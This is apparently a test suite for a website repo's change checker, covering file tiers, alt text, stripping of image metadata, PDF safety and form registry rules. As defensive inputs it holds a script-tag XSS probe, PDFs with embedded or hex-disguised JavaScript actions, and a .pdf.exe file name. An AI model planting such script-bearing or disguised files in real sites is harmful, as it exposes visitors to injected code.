  const missing = inRepo(({ write }) => write("src/content/pages/about.json", page({ src: "/images/nope.jpg", alt: "The studio front desk" })));
  assert.equal(missing.code, 1, missing.report);
  assert.match(missing.report, /Content problems/);
  assert.match(missing.report, /about\.json, block 2 \(video\)/);
  const good = inRepo(({ write }) => {
    write("public/images/studio.jpg", makeJpeg());
    write("src/content/pages/about.json", page({ src: "/images/studio.jpg", alt: "The studio front desk" }));
  });
  assert.equal(good.code, 0, good.report);
  assert.match(good.report, /public\/images\/studio\.jpg: alt "The studio front desk"/);
  const generic = inRepo(({ write }) => {
    write("public/images/studio.jpg", makeJpeg());
    write("src/content/pages/about.json", page({ src: "/images/studio.jpg", alt: "photo" }));
  });
  assert.equal(generic.code, 1, generic.report);
  assert.match(generic.report, /says nothing/);
});

test("real git: deleting a page file is tier 3 with the archive reason", () => {
  const { code, report } = inRepo(({ dir }) => rmSync(join(dir, "src/content/pages/about.json")));
  assert.equal(code, 1, report);
  assert.match(report, /Tier 3/);
  assert.match(report, /pages are archived, not deleted: set its status to "archived" instead/);
});

test("real git: archiving a page (status archived) is a plain page edit and passes", () => {
  const { code, report } = inRepo(({ write }) => write("src/content/pages/about.json", pageText("/about", { status: "archived" })));
  assert.equal(code, 0, report);
});

test("real git: a new [[placeholder]] in a page file is blocking on a change branch", () => {
  const { code, report } = inRepo(({ write }) => write("src/content/pages/about.json", pageText("/about", { title: "[[About title]]" })));
  assert.equal(code, 1, report);
  assert.match(report, /Leftover \[\[placeholder\]\] text/);
  assert.match(report, /\[\[About title\]\]/);
});

test("real git: only image files at the head commit count for the content check", () => {
  const { code, report } = inRepo(({ write }) => {
    write("public/images/a.jpg", makeJpeg());
    write("src/content/pages/about.json", pageText("/about"));
  });
  assert.equal(code, 1, report); // the image is not used anywhere, so the alt check fails; the page itself is fine
  assert.doesNotMatch(report, /Content problems/);
});

// ---- the content check inside evaluateChange, with fake pages ---------------------------------------------------

test("evaluateChange runs the content check only when page data is given, and lists each problem as a blocking content problem", () => {
  const fake = (pages, repo) => ({ pages: pages.map((file) => ({ file, data: {} })), repo });
  let seen;
  const validate = (pages, registryList, repo) => {
    seen = { files: pages.map((p) => p.file), hasRegistry: Array.isArray(registryList) && registryList.length > 0, image: repo.imageExists("/images/a.jpg"), other: repo.imageExists("/images/b.jpg") };
    return ["about.json, block 2 (faq): too many questions."];
  };
  const files = [file("src/content/pages/about.json")];
  const none = evaluateChange({ files }, rules, validate);
  assert.deepEqual(none.contentProblems, []);
  const result = evaluateChange({ files, ...fake(["about.json", "home.json"]), headImages: ["public/images/a.jpg"] }, rules, validate);
  assert.deepEqual(seen, { files: ["about.json", "home.json"], hasRegistry: true, image: true, other: false });
  assert.deepEqual(result.contentProblems, ["about.json, block 2 (faq): too many questions."]);
  assert.equal(result.tier, 1, "a content problem does not make the change tier 3");
  assert.equal(decide(result, "strict").ok, false);
  assert.deepEqual(decide(result, "strict").reasons, ["content problem"]);
  assert.equal(decide(result, "report-only").ok, true);
  const report = formatReport(result, { mode: "strict" });
  assert.match(report, /Content problems in the page files \(blocking on client change branches\):\n  - about\.json, block 2 \(faq\)/);
});

test("gatherChange reads every page file and the image list at the head commit when a page file changes", () => {
  const home = JSON.stringify(pageData("/"));
  const table = {
    [`diff --raw -z --no-renames ${RANGE}`]: rawEntry("M", "src/content/pages/home.json"),
    [`diff -U0 --no-renames --text ${RANGE} -- src/content/pages/home.json`]: "",
    "ls-tree --name-only -z HEAD -- src/content/pages/": "src/content/pages/home.json\0src/content/pages/broken.json\0",
    "show HEAD:src/content/pages/home.json": home,
    "show HEAD:src/content/pages/broken.json": "{",
    "ls-tree -r --name-only -z HEAD -- public/images/": "public/images/a.jpg\0public/images/team/b.png\0",
    "ls-tree -r --name-only -z HEAD -- public/files/": "public/files/menu.pdf\0",
    "ls-tree -r --name-only -z HEAD -- src/content/collections/": "",
    "ls-tree --name-only -z HEAD -- src/content/business.json src/content/brand.json src/content/notice.json": "",
    "ls-tree --name-only -z HEAD -- src/content/forms/": "src/content/forms/contact.json\0",
    "show HEAD:src/content/forms/contact.json": "{}",
    "ls-tree --name-only -z HEAD -- src/forms/registry.generated.ts": "",
  };
  const change = gatherChange({ base: "origin/main", head: "HEAD", git: fakeGit(table) });
  assert.deepEqual(change.site.forms, [{ id: "contact", data: {} }]);
  assert.deepEqual(change.headFiles, ["public/files/menu.pdf"]);
  assert.deepEqual(change.pages.map((p) => p.file), ["broken.json", "home.json"]);
  assert.match(change.pages[0].error, /^is not valid JSON/);
  assert.deepEqual(change.pages[1].data, JSON.parse(home));
  assert.deepEqual(change.headImages, ["public/images/a.jpg", "public/images/team/b.png"]);
  const result = evaluateChange(change, rules, () => [], () => []);
  assert.deepEqual(result.contentProblems, []);
});

// ---- hidden image data and alt text ---------------------------------------------------------------------------

const withRefs = (files, imageRefs = {}) => evaluateChange({ files, imageRefs }, rules);
const usedAs = (url, alt = "The front desk at opening time") => [{ path: "src/content/home.ts", content: `export const hero = { src: "${url}", alt: ${JSON.stringify(alt)} };\n` }];
const EXIF_NAME = "EXIF (camera and location data)";

test("an image used with real alt text has no alt problem, and its alt text is listed for the report", () => {
  const result = withRefs([image("public/images/a.jpg", jpg)], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.deepEqual(result.altProblems, []);
  assert.deepEqual(result.images, [{ path: "public/images/a.jpg", alts: ["The front desk at opening time"] }]);
  assert.equal(decide(result, "strict").ok, true);
});

test("an added image that nothing uses fails the alt check", () => {
  const result = withRefs([image("public/images/a.jpg", jpg)]);
  assert.equal(result.altProblems.length, 1);
  assert.equal(result.altProblems[0].path, "public/images/a.jpg");
  assert.match(result.altProblems[0].reason, /not used/);
});

test("a changed image (not only a new one) must have alt text, and a bad alt names the file that holds it", () => {
  const changed = file("public/images/a.jpg", "M", { head: jpg, size: 1000 });
  const result = withRefs([changed], { "public/images/a.jpg": usedAs("/images/a.jpg", "photo") });
  assert.equal(result.altProblems.length, 1);
  assert.match(result.altProblems[0].reason, /src\/content\/home\.ts/);
  assert.match(result.altProblems[0].reason, /says nothing/);
});

test("deleted images and files outside public/images need no alt text", () => {
  assert.deepEqual(withRefs([file("public/images/a.jpg", "D")]).altProblems, []);
  assert.deepEqual(withRefs([image("public/brand/logo.png", png)]).altProblems, []);
  assert.deepEqual(withRefs([file("public/images/a.jpg", "D")]).images, []);
});

test("every image in a change is checked on its own", () => {
  const result = withRefs([image("public/images/a.jpg", jpg), image("public/images/b.jpg", jpg)], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.deepEqual(result.altProblems.map((p) => p.path), ["public/images/b.jpg"]);
});

test("an image that still carries camera or location data fails and says how to fix it", () => {
  const dirty = file("public/images/a.jpg", "A", { head: jpg, size: 1000, metadata: { removed: [EXIF_NAME, "comment"] } });
  const result = withRefs([dirty], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.equal(result.imageProblems.length, 1);
  assert.match(result.imageProblems[0].reason, /EXIF/);
  assert.match(result.imageProblems[0].reason, /comment/);
  assert.match(result.imageProblems[0].reason, /npm run strip:images/);
  assert.equal(decide(result, "strict").ok, false);
});

test("a clean image has no metadata problem, and an image that could not be read says so once", () => {
  const clean = file("public/images/a.jpg", "A", { head: jpg, size: 1000, metadata: { removed: [] } });
  assert.deepEqual(withRefs([clean], { "public/images/a.jpg": usedAs("/images/a.jpg") }).imageProblems, []);
  const unreadable = file("public/images/a.jpg", "A", { head: jpg, size: 1000, metadata: { error: "not a valid JPEG: cut short" } });
  const result = withRefs([unreadable], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.equal(result.imageProblems.length, 1);
  assert.match(result.imageProblems[0].reason, /could not be checked/);
  const renamed = file("public/images/a.png", "A", { head: svg, size: 1000, metadata: { error: "not a valid PNG: it does not start with the PNG signature" } });
  assert.equal(withRefs([renamed], { "public/images/a.png": usedAs("/images/a.png") }).imageProblems.length, 1, "only the renamed-file problem, not a second one");
});

test("strict mode fails on a missing alt text, report-only mode never does, and the reason is named", () => {
  const result = withRefs([image("public/images/a.jpg", jpg)]);
  assert.equal(decide(result, "strict").ok, false);
  assert.deepEqual(decide(result, "strict").reasons, ["image alt text missing"]);
  assert.equal(decide(result, "report-only").ok, true);
});

test("the report lists the images with their alt text, and the problems with how to fix them", () => {
  const good = formatReport(withRefs([image("public/images/a.jpg", jpg)], { "public/images/a.jpg": usedAs("/images/a.jpg") }), { mode: "strict" });
  assert.match(good, /Images in this change/);
  assert.match(good, /public\/images\/a\.jpg: alt "The front desk at opening time"/);
  assert.match(good, /PASS/);
  const dirty = file("public/images/b.jpg", "A", { head: jpg, size: 1000, metadata: { removed: [EXIF_NAME] } });
  const bad = formatReport(withRefs([image("public/images/a.jpg", jpg), dirty]), { mode: "strict" });
  assert.match(bad, /Alt text problems/);
  assert.match(bad, /not used/);
  assert.match(bad, /npm run strip:images/);
  assert.match(bad, /FAIL \(.*image rule broken.*image alt text missing.*\)/);
});

test("gatherChange reads each image's hidden data and the files that use it", () => {
  const change = gatherChange({ base: "origin/main", head: "HEAD", git: fakeGit(scenario()) });
  assert.deepEqual(change.files[1].metadata, { removed: [] });
  assert.deepEqual(change.imageRefs, { "public/images/new.jpg": [{ path: "src/content/home.ts", content: HOME_WITH_IMAGE }] });
  const result = evaluateChange(change, rules);
  assert.deepEqual(result.altProblems, []);
  assert.deepEqual(result.imageProblems, []);
  assert.deepEqual(result.images, [{ path: "public/images/new.jpg", alts: ["The front desk at opening time"] }]);
});

test("an image with EXIF and GPS data fails through main, in strict mode only", () => {
  const dirty = { ...scenario(), "show HEAD:public/images/new.jpg": makeJpeg([app1Exif()]) };
  const out = [];
  assert.equal(main({ argv: [], env: {}, git: fakeGit(dirty), out: (t) => out.push(t) }), 1);
  assert.match(out.join("\n"), /npm run strip:images/);
  assert.ok(!out.join("\n").includes(SECRET.gps), "the report never prints the hidden data itself");
  assert.equal(main({ argv: ["--report-only"], env: {}, git: fakeGit(dirty), out: () => {} }), 0);
});

test("when git grep finds no file that uses the image the check fails cleanly, and when git grep breaks the check could not run", () => {
  const unused = { ...scenario(), [grepKey("/images/new.jpg")]: null };
  const out = [];
  assert.equal(main({ argv: [], env: {}, git: fakeGit(unused), out: (t) => out.push(t) }), 1);
  assert.match(out.join("\n"), /not used/);
  const broken = (args) => {
    if (args[0] === "grep") throw Object.assign(new Error("fatal: bad object"), { status: 128, stderr: Buffer.from("fatal: bad object") });
    return fakeGit(scenario())(args);
  };
  assert.equal(main({ argv: [], env: {}, git: broken, out: (t) => out.push(t) }), 2);
  assert.match(out.join("\n"), /could not read the git history/);
});

test("only .ts and .tsx files count as a use of an image", () => {
  const css = { ...scenario(), [grepKey("/images/new.jpg")]: "HEAD:src/app/hl.css\0HEAD:src/content/home.ts\0" };
  const change = gatherChange({ base: "origin/main", head: "HEAD", git: fakeGit(css) });
  assert.deepEqual(change.imageRefs["public/images/new.jpg"].map((f) => f.path), ["src/content/home.ts"]);
});

const HOME_WITH_HERO = (url, alt) => `export const title = "Old";\nexport const hero = { src: "${url}", alt: "${alt}" };\n`;

test("real git: clean jpg, png and webp images that are used with alt text pass", () => {
  for (const [name, bytes] of [["a.jpg", makeJpeg()], ["b.png", makePng()], ["c.webp", makeWebp()]]) {
    const { code, report } = inRepo(({ write }) => {
      write(`public/images/${name}`, bytes);
      write("src/content/home.ts", HOME_WITH_HERO(`/images/${name}`, "Sam at the front desk"));
    });
    assert.equal(code, 0, `${name}\n${report}`);
    assert.match(report, new RegExp(`public/images/${name.replace(".", "\\.")}: alt "Sam at the front desk"`));
  }
});

test("real git: an image with EXIF data fails, whatever the type, and the report never contains the hidden data", () => {
  for (const [name, bytes] of [["a.jpg", makeJpeg([app1Exif()])], ["b.png", makePng([pngText("Author", SECRET.comment)])], ["c.webp", makeWebp({ exif: true })]]) {
    const { code, report } = inRepo(({ write }) => {
      write(`public/images/${name}`, bytes);
      write("src/content/home.ts", HOME_WITH_HERO(`/images/${name}`, "Sam at the front desk"));
    });
    assert.equal(code, 1, `${name}\n${report}`);
    assert.match(report, /npm run strip:images/);
    for (const secret of Object.values(SECRET)) assert.ok(!report.includes(secret), `${name} leaked ${secret}`);
  }
});

test("real git: an unused image, an image without alt text and an image with bad alt text all fail", () => {
  const unused = inRepo(({ write }) => write("public/images/a.jpg", makeJpeg()));
  assert.equal(unused.code, 1, unused.report);
  assert.match(unused.report, /not used/);
  const noAlt = inRepo(({ write }) => {
    write("public/images/a.jpg", makeJpeg());
    write("src/content/home.ts", 'export const title = "Old";\nexport const hero = { src: "/images/a.jpg" };\n');
  });
  assert.equal(noAlt.code, 1, noAlt.report);
  assert.match(noAlt.report, /no alt text/);
  const generic = inRepo(({ write }) => {
    write("public/images/a.jpg", makeJpeg());
    write("src/content/home.ts", HOME_WITH_HERO("/images/a.jpg", "image"));
  });
  assert.equal(generic.code, 1, generic.report);
  assert.match(generic.report, /says nothing/);
});

test("real git: an image in a sub-folder is found by its full path, and a deleted image needs nothing", () => {
  const nested = inRepo(({ write }) => {
    write("public/images/team/sam.jpg", makeJpeg());
    write("src/content/home.ts", HOME_WITH_HERO("/images/team/sam.jpg", "Sam at the front desk"));
  });
  assert.equal(nested.code, 0, nested.report);
  const { dir, git } = makeRepo(({ write }) => write("public/images/old.jpg", makeJpeg()));
  try {
    git(["checkout", "-q", "-b", "change/remove"]);
    rmSync(join(dir, "public/images/old.jpg"));
    git(["add", "-A"]);
    git(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "remove"]);
    const out = [];
    assert.equal(main({ argv: ["--base", "change/test", "--head", "HEAD"], env: {}, git, out: (t) => out.push(t) }), 0, out.join("\n"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---- PDFs under public/files/ ---------------------------------------------------------------------------------

const makePdf = (extra = "") =>
  Buffer.from(`%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R ${extra}>>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n`, "latin1");
const SHEET_LINK = 'export const sheet = { label: "Price sheet", href: "/files/price-sheet.pdf" };\n';

test("a PDF is tier 1 by name: lowercase words joined by hyphens, one level, .pdf; anything else in public/files is tier 3", () => {
  const pdf = (path, extra = {}) => file(path, "A", { pdfProblem: null, ...extra });
  const refs = { "public/files/price-sheet.pdf": [{ path: "src/content/home.ts", content: SHEET_LINK }] };
  const ok = evaluateChange({ files: [pdf("public/files/price-sheet.pdf")], fileRefs: refs }, rules);
  assert.equal(ok.tier, 1);
  assert.deepEqual(ok.fileProblems, []);
  for (const path of ["public/files/Price-Sheet.pdf", "public/files/price_sheet.pdf", "public/files/price--sheet.pdf", "public/files/menu.docx", "public/files/sub/menu.pdf", "public/files/menu.pdf.exe", "public/files/.hidden", "public/files/notes.html"]) {
    const result = run([pdf(path)]);
    assert.equal(result.tier, 3, path);
    assert.match(result.outside[0].reason, /only PDFs named in lowercase words joined by hyphens can go in public\/files\//, path);
  }
});

test("deleting a PDF is tier 1 and is not checked; deleting an oddly named file in public/files is tier 3", () => {
  assert.equal(run([file("public/files/old-menu.pdf", "D")]).tier, 1);
  assert.deepEqual(run([file("public/files/old-menu.pdf", "D")]).fileProblems, []);
  assert.equal(run([file("public/files/Old.exe", "D")]).tier, 3);
});

test("a PDF that fails its byte check or is not used fails in strict mode, with a message that names the fix", () => {
  const path = "public/files/price-sheet.pdf";
  const used = { [path]: [{ path: "src/content/home.ts", content: SHEET_LINK }] };
  const bad = evaluateChange({ files: [file(path, "A", { pdfProblem: "it holds a script" })], fileRefs: used }, rules);
  assert.equal(bad.fileProblems.length, 1);
  assert.equal(decide(bad, "strict").ok, false);
  assert.match(decide(bad, "strict").reasons.join(), /PDF rule broken/);
  assert.equal(decide(bad, "report-only").ok, true);
  const unused = evaluateChange({ files: [file(path, "A", { pdfProblem: null })] }, rules);
  assert.match(unused.fileProblems[0].reason, /nothing in src\/ links to \/files\/price-sheet\.pdf/);
  const partial = evaluateChange({ files: [file(path, "A", { pdfProblem: null })], fileRefs: { [path]: [{ path: "src/content/home.ts", content: 'const x = "/files/price-sheet.pdf.bak";\n' }] } }, rules);
  assert.equal(partial.fileProblems.length, 1);
  assert.match(formatReport(bad, { mode: "strict" }), /PDF problems \(blocking on client change branches\):\n {2}- public\/files\/price-sheet\.pdf: it holds a script/);
});

test("real git: a good PDF used in a content file passes", () => {
  const { code, report } = inRepo(({ write }) => {
    write("public/files/price-sheet.pdf", makePdf());
    write("src/content/home.ts", SHEET_LINK);
  });
  assert.equal(code, 0, report);
  assert.match(report, /Tier 1/);
});

test("real git: a good PDF used in a page file has no PDF problem", () => {
  const page = pageData("/about", { menu: { label: "About", order: 20, places: ["header"] }, notes: "/files/price-sheet.pdf" });
  const { report } = inRepo(({ write }) => {
    write("public/files/price-sheet.pdf", makePdf());
    write("src/content/pages/about.json", JSON.stringify(page, null, 2));
  });
  assert.doesNotMatch(report, /PDF problems/);
  assert.doesNotMatch(report, /Tier 3/);
});

test("real git: a PDF nothing links to fails and says to add the link", () => {
  const { code, report } = inRepo(({ write }) => write("public/files/price-sheet.pdf", makePdf()));
  assert.equal(code, 1, report);
  assert.match(report, /Tier 1/);
  assert.match(report, /PDF problems/);
  assert.match(report, /nothing in src\/ links to \/files\/price-sheet\.pdf/);
});

test("real git: a PDF with a script fails and says to save it again as a plain PDF, even when the name is disguised", () => {
  for (const name of ["/JavaScript 5 0 R ", "/J#61vaScript 5 0 R "]) {
    const { code, report } = inRepo(({ write }) => {
      write("public/files/price-sheet.pdf", makePdf(name));
      write("src/content/home.ts", SHEET_LINK);
    });
    assert.equal(code, 1, report);
    assert.match(report, /save it again as a plain PDF \(Print, then Save as PDF\)/i);
  }
});

test("real git: a name that only starts like an active one passes", () => {
  const { code, report } = inRepo(({ write }) => {
    write("public/files/price-sheet.pdf", makePdf("/JSFoo 1 "));
    write("src/content/home.ts", SHEET_LINK);
  });
  assert.equal(code, 0, report);
});

test("real git: a PDF over 10 MB fails", () => {
  const big = Buffer.concat([makePdf().subarray(0, 9), Buffer.alloc(10 * 1000 * 1000, 0x20), makePdf().subarray(9)]);
  const { code, report } = inRepo(({ write }) => {
    write("public/files/price-sheet.pdf", big);
    write("src/content/home.ts", SHEET_LINK);
  });
  assert.equal(code, 1, report);
  assert.match(report, /over the 10 MB limit/);
});

test("real git: bytes that are not a PDF under a .pdf name fail", () => {
  for (const bytes of [Buffer.from("<html><script>alert(1)</script></html>"), jpg]) {
    const { code, report } = inRepo(({ write }) => {
      write("public/files/price-sheet.pdf", bytes);
      write("src/content/home.ts", SHEET_LINK);
    });
    assert.equal(code, 1, report);
    assert.match(report, /not really a PDF/);
  }
});

test("real git: a wrongly named file in public/files is tier 3 with the plain reason", () => {
  const { code, report } = inRepo(({ write }) => {
    write("public/files/Price Sheet.pdf", makePdf());
    write("public/files/menu.html", "<p>hi</p>");
  });
  assert.equal(code, 1, report);
  assert.match(report, /Tier 3/);
  assert.match(report, /only PDFs named in lowercase words joined by hyphens can go in public\/files\//);
});

test("real git: deleting a PDF passes", () => {
  const { dir, git } = makeRepo(({ write }) => {
    write("public/files/old-menu.pdf", makePdf());
    write("src/content/home.ts", 'export const menu = "/files/old-menu.pdf";\n');
  });
  try {
    git(["checkout", "-q", "-b", "change/remove-pdf"]);
    rmSync(join(dir, "public/files/old-menu.pdf"));
    writeFileSync(join(dir, "src/content/home.ts"), 'export const menu = "";\n');
    git(["add", "-A"]);
    git(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "remove"]);
    const out = [];
    assert.equal(main({ argv: ["--base", "change/test", "--head", "HEAD"], env: {}, git, out: (t) => out.push(t) }), 0, out.join("\n"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---- collections, settings and the generated brand files (rulings 28 to 30) --------------------------------------------

const brandJson = JSON.parse(readFileSync(new URL("../src/content/brand.json", import.meta.url), "utf8"));
const generated = brandFiles(brandJson, { preloadAccent: siteConfig.preloadAccentFont === true });
const withSite = (files, extra = {}) => evaluateChange({ files, site: { items: [], brand: brandJson, settingsErrors: {} }, pages: [], ...extra }, rules, () => [], () => []);
const item = (path, status = "M") => file(path, status, { content: undefined });
const outsidePaths = (result) => result.outside.map((o) => o.path);

test("rules: the item folder and the settings files match the shared constants", () => {
  assert.equal(rules.itemDir, `${ITEM_DIR}/`);
  assert.deepEqual(rules.settingsFiles, SETTINGS_NAMES.map((name) => `src/content/${name}.json`));
  assert.deepEqual(rules.generatedFiles, Object.keys(generated));
});

test("an item file under a known kind with a good slug is tier 1, whether new or edited", () => {
  const result = withSite([item("src/content/collections/posts/spring-news.json", "A"), item("src/content/collections/team/sam.json")]);
  assert.equal(result.tier, 1);
  assert.deepEqual(result.outside, []);
});

test("the three settings files are tier 1", () => {
  const result = withSite([item("src/content/business.json"), item("src/content/notice.json"), item("src/content/brand.json")]);
  assert.equal(result.tier, 1);
});

test("a deleted item or a deleted settings file is tier 3 with the archive reason", () => {
  const result = withSite([item("src/content/collections/posts/old.json", "D"), item("src/content/notice.json", "D")]);
  assert.equal(result.tier, 3);
  assert.deepEqual(outsidePaths(result), ["src/content/collections/posts/old.json", "src/content/notice.json"]);
  assert.match(result.outside[0].reason, /archived, not deleted/);
});

test("a renamed item (a delete plus an add) is tier 3", () => {
  const result = withSite([item("src/content/collections/posts/old.json", "D"), item("src/content/collections/posts/new.json", "A")]);
  assert.deepEqual(outsidePaths(result), ["src/content/collections/posts/old.json"]);
});

test("an unknown kind, a bad slug, a nested file and any other file under collections are tier 3", () => {
  const result = withSite([
    item("src/content/collections/recipes/pie.json", "A"),
    item("src/content/collections/posts/Bad_Slug.json", "A"),
    item("src/content/collections/posts/deep/nested.json", "A"),
    item("src/content/collections/posts/notes.txt", "A"),
    item("src/content/collections/readme.json", "A"),
  ]);
  assert.equal(result.tier, 3);
  assert.equal(result.outside.length, 5);
  assert.match(result.outside[0].reason, /"recipes" is not a collection/);
  assert.match(result.outside[1].reason, /slug "Bad_Slug"/);
  assert.match(result.outside[2].reason, /not an item file/);
});

test("generated palette.css and fonts.ts are tier 1 only when byte-equal to what brand.json generates", () => {
  const same = withSite([file("src/app/palette.css", "M", { content: generated["src/app/palette.css"] }), file("src/lib/fonts.ts", "M", { content: generated["src/lib/fonts.ts"] })]);
  assert.equal(same.tier, 1);
  const edited = withSite([file("src/app/palette.css", "M", { content: generated["src/app/palette.css"].replace(brandJson.colors.green, "#000000") })]);
  assert.equal(edited.tier, 3);
  assert.match(edited.outside[0].reason, /a generated brand file that does not match brand\.json/);
  const fonts = withSite([file("src/lib/fonts.ts", "M", { content: `${generated["src/lib/fonts.ts"]}// hand edit\n` })]);
  assert.equal(fonts.tier, 3);
});

test("a generated file with no brand.json to compare to is tier 3, and a deleted one too", () => {
  const nothing = evaluateChange({ files: [file("src/app/palette.css", "M", { content: generated["src/app/palette.css"] })] }, rules, () => [], () => []);
  assert.equal(nothing.tier, 3);
  const broken = evaluateChange({ files: [file("src/app/palette.css", "M", { content: generated["src/app/palette.css"] })], site: { items: [], brand: { colors: {} } } }, rules, () => [], () => []);
  assert.equal(broken.tier, 3);
  assert.equal(withSite([file("src/lib/fonts.ts", "D")]).tier, 3);
});

test("a brand change is marked in the report: it touches every page and needs a preview", () => {
  const brand = withSite([item("src/content/brand.json")]);
  assert.equal(brand.brandChange, true);
  assert.match(formatReport(brand, { mode: "strict" }), /Brand change: touches every page; it needs a preview before the yes\./);
  const colors = withSite([file("src/app/palette.css", "M", { content: generated["src/app/palette.css"] })]);
  assert.equal(colors.brandChange, true);
  const other = withSite([item("src/content/business.json")]);
  assert.equal(other.brandChange, false);
  assert.doesNotMatch(formatReport(other, { mode: "strict" }), /Brand change/);
});

test("with the site read, the whole site is judged: a problem in an item is a blocking content problem", () => {
  let seen;
  const validateSite = (input) => {
    seen = input;
    return ["src/content/collections/posts/spring-news.json: \"title\" is required."];
  };
  const result = evaluateChange({ files: [item("src/content/collections/posts/spring-news.json", "A")], pages: [{ file: "home.json", data: {} }], site: { items: [], brand: brandJson } }, rules, () => [], validateSite);
  assert.equal(seen.pages.length, 1);
  assert.equal(seen.brand, brandJson);
  assert.equal(result.tier, 1);
  assert.deepEqual(decide(result, "strict").reasons, ["content problem"]);
});

test("a new [[placeholder]] in an item or in business.json blocks like one in a page file", () => {
  const added = (path) => item(path, "M");
  const result = withSite([{ ...added("src/content/collections/posts/a.json"), added: ['"title": "[[todo]]"'] }, { ...added("src/content/business.json"), added: ['"phone": "[[phone]]"'] }]);
  assert.deepEqual(result.placeholders.map((p) => p.text), ["[[todo]]", "[[phone]]"]);
});

test("an image used in an item with alt text next to it counts as a use", () => {
  const url = "/images/team/sam.jpg";
  const itemRef = [{ path: "src/content/collections/team/sam.json", content: JSON.stringify({ status: "live", name: "Sam", photo: { src: url, alt: "Sam at the front desk" } }) }];
  const ok = evaluateChange({ files: [image("public/images/team/sam.jpg", jpg)], imageRefs: { "public/images/team/sam.jpg": itemRef } }, rules);
  assert.deepEqual(ok.altProblems, []);
  const bare = [{ path: "src/content/collections/team/sam.json", content: JSON.stringify({ photo: { src: url } }) }];
  const bad = evaluateChange({ files: [image("public/images/team/sam.jpg", jpg)], imageRefs: { "public/images/team/sam.jpg": bare } }, rules);
  assert.equal(bad.altProblems.length, 1);
});

test("real git: gatherChange reads items and settings at the head commit, and the whole site is checked", () => {
  const { code, report } = inRepo(({ write }) => {
    write("src/content/collections/posts/bad-post.json", "{}\n");
    write("src/content/notice.json", "{ not json");
  });
  assert.equal(code, 1, report);
  assert.match(report, /src\/content\/collections\/posts\/bad-post\.json/);
  assert.match(report, /src\/content\/notice\.json is not valid JSON/);
  assert.doesNotMatch(report, /business\.json/);
});

test("real git: a hand-edited palette.css is tier 3; one that matches brand.json passes the scope", () => {
  const { code, report } = inRepo(({ write }) => {
    write("src/content/brand.json", `${JSON.stringify(brandJson, null, 2)}\n`);
    write("src/app/palette.css", generated["src/app/palette.css"].replace(brandJson.colors.green, "#000000"));
  });
  assert.equal(code, 1, report);
  assert.match(report, /Tier 3/);
  assert.match(report, /src\/app\/palette\.css \(a generated brand file that does not match brand\.json/);
  const ok = inRepo(({ write }) => {
    write("src/content/brand.json", `${JSON.stringify(brandJson, null, 2)}\n`);
    write("src/app/palette.css", generated["src/app/palette.css"]);
    write("src/lib/fonts.ts", generated["src/lib/fonts.ts"]);
  });
  assert.match(ok.report, /Tier 1/);
  assert.match(ok.report, /Brand change/);
});

// ---- forms (Forms and downloads, task 5) --------------------------------------------------------------------------------

const withForms = (files, ids = ["contact", "quote"], extra = {}) =>
  evaluateChange({ files, site: { items: [], brand: brandJson, settingsErrors: {}, forms: ids.map((id) => ({ id, data: {} })) }, pages: [], ...extra }, rules, () => [], () => []);

test("rules: the form folder and the registry match the shared constants", () => {
  assert.equal(rules.formDir, `${FORM_DIR}/`);
  assert.equal(rules.registryFile, REGISTRY_PATH);
});

test("a form file with a slug id is tier 1, new or edited; a bad id or a nested file is tier 3", () => {
  assert.equal(withForms([item("src/content/forms/quote.json", "A"), item("src/content/forms/newsletter-signup.json")]).tier, 1);
  const bad = withForms([item("src/content/forms/Quote_1.json", "A"), item("src/content/forms/deep/x.json", "A"), item("src/content/forms/notes.txt", "A")]);
  assert.equal(bad.outside.length, 3);
  assert.match(bad.outside[0].reason, /not a form file/);
});

test("the contact form's file is tier 3 whatever the change: its wiring", () => {
  for (const status of ["M", "A", "D"]) {
    const result = withForms([item("src/content/forms/contact.json", status)]);
    assert.equal(result.tier, 3);
    assert.equal(result.outside[0].reason, "the contact form's wiring");
  }
});

test("a deleted or renamed form file is tier 3: archive it instead", () => {
  const result = withForms([item("src/content/forms/quote.json", "D"), item("src/content/forms/quote-2.json", "A")]);
  assert.deepEqual(outsidePaths(result), ["src/content/forms/quote.json"]);
  assert.match(result.outside[0].reason, /archived, not deleted/);
});

test("the registry is tier 1 only when byte-equal to what the head's form files generate", () => {
  const same = withForms([file(REGISTRY_PATH, "M", { content: registrySource(["contact", "quote"]) })]);
  assert.equal(same.tier, 1);
  const edited = withForms([file(REGISTRY_PATH, "M", { content: `${registrySource(["contact", "quote"])}// hand edit\n` })]);
  assert.equal(edited.tier, 3);
  assert.match(edited.outside[0].reason, /form registry does not match/);
  assert.equal(withForms([file(REGISTRY_PATH, "M", { content: registrySource(["contact"]) })]).tier, 3);
  assert.equal(withForms([file(REGISTRY_PATH, "D")]).tier, 3);
  assert.equal(evaluateChange({ files: [file(REGISTRY_PATH, "M", { content: registrySource(["contact"]) })] }, rules, () => [], () => []).tier, 3);
});

test("anything else under src/forms/ is tier 3: form rules (code)", () => {
  const result = withForms([file("src/forms/validate.ts"), file("src/forms/schema.ts", "A")]);
  assert.equal(result.tier, 3);
  assert.deepEqual(result.outside.map((o) => o.reason), ["form rules (code)", "form rules (code)"]);
  assert.equal(run([file("site.config.ts")]).outside[0].reason, "the site settings");
});

test("with a form file changed, the whole site is judged with the form settings and the registry ids", () => {
  let seen;
  let extraSeen;
  const validateSite = (input, registry, repo, extra) => {
    seen = input;
    extraSeen = extra;
    return ['src/content/forms/quote.json: "button" is required.'];
  };
  const forms = [{ id: "quote", data: {} }];
  const result = evaluateChange({ files: [item("src/content/forms/quote.json", "A")], pages: [], site: { items: [], brand: brandJson, forms, registryIds: ["quote"] } }, rules, () => [], validateSite);
  assert.equal(seen.forms, forms);
  assert.deepEqual(extraSeen.registryIds, ["quote"]);
  assert.ok(extraSeen.formSettings.maxForms > 0);
  assert.deepEqual(decide(result, "strict").reasons, ["content problem"]);
});

